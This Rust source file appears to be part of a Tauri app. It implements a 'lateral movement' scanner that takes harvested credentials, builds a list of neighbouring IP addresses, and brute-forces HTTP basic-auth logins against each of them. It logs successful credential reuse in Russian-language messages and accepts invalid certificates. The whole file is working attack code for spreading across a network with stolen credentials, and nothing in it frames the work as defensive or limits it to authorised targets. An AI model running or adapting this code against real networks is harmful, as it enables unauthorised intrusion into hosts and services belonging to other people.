use reqwest::Client;
use serde::Serialize;
use std::time::Duration;

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LateralReport {
    pub target_ip: String,
    pub service: String,
    pub status: String,
}

#[tauri::command]
pub async fn scan_lateral_movement(
    target_ips: Vec<String>,
    known_logins: Vec<String>,
    known_passwords: Vec<String>,
) -> Result<Vec<LateralReport>, String> {
    let mut reports = Vec::new();
    let client = Client::builder()
        .timeout(Duration::from_secs(4))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    for ip in target_ips {
        let mut access_gained = false;

        for login in &known_logins {
            if access_gained {
                break;
            }

            for pass in &known_passwords {
                let test_url = format!("http://{}/", ip);
                eprintln!(
                    "🕷️ LATERAL SPIDER: Проверка узла {} с кредами {}:{}",
                    ip, login, pass
                );

                if let Ok(resp) = client.get(&test_url).basic_auth(login, Some(pass)).send().await {
                    let status = resp.status();
                    if status != reqwest::StatusCode::UNAUTHORIZED
                        && status != reqwest::StatusCode::FORBIDDEN
                    {
                        reports.push(LateralReport {
                            target_ip: ip.clone(),
                            service: "HTTP".to_string(),
                            status: "CREDENTIAL_REUSE_SUCCESS".to_string(),
                        });
                        eprintln!(
                            "🚨 УСПЕШНОЕ БОКОВОЕ ПЕРЕМЕЩЕНИЕ: Доступ к {} получен ({})",
                            ip, login
                        );
                        access_gained = true;
                        break;
                    }
                }
            }
        }
    }

    Ok(reports)
}


pub async fn check_neighbors(
    target_ip: &str,
    known_creds: Vec<String>,
) -> Result<Option<String>, String> {
    let mut known_logins = Vec::new();
    let mut known_passwords = Vec::new();

    for entry in known_creds {
        if let Some((l, p)) = entry.split_once(':') {
            let login = l.trim();
            let pass = p.trim();
            if !login.is_empty() && !pass.is_empty() {
                known_logins.push(login.to_string());
                known_passwords.push(pass.to_string());
            }
        }
    }

    if known_logins.is_empty() || known_passwords.is_empty() {
        return Ok(None);
    }

    let neighbors = generate_neighbors(target_ip, 2);
    if neighbors.is_empty() {
        return Ok(None);
    }

    let results = scan_lateral_movement(neighbors, known_logins, known_passwords).await?;
    if results.is_empty() {
        return Ok(None);
    }

    let summary = results
        .iter()
        .map(|r| format!("{} [{}]", r.target_ip, r.service))
        .collect::<Vec<_>>()
        .join(" | ");

    Ok(Some(summary))
}

fn generate_neighbors(ip: &str, range: u8) -> Vec<String> {
    let mut neighbors = Vec::new();
    if let Some(dot_idx) = ip.rfind('.') {
        let prefix = &ip[..dot_idx];
        if let Ok(last) = ip[dot_idx + 1..].parse::<u16>() {
            let start = (last as i32 - range as i32).max(1) as u16;
            let end = (last + range as u16).min(254);
            for i in start..=end {
                if i != last {
                    neighbors.push(format!("{}.{}", prefix, i));
                }
            }
        }
    }
    neighbors
}
